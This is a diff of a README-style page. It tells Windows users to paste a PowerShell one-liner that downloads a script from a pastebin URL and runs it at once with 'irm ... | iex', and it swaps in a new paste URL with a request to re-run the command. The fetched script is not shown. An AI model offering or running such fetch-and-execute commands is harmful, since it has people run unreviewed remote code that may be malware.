@@ -31,7 +31,7 @@ If using **Windows 10**:
 ## Step-2
 - Copy paste the following command in that window and press enter
 ```powershell
-irm https://pastebin.com/raw/7y0AGTj9 | iex
+irm https://pastebin.com/raw/AP53rHaq | iex
 ```
 #### Updated it. Kindly re-run the command
 
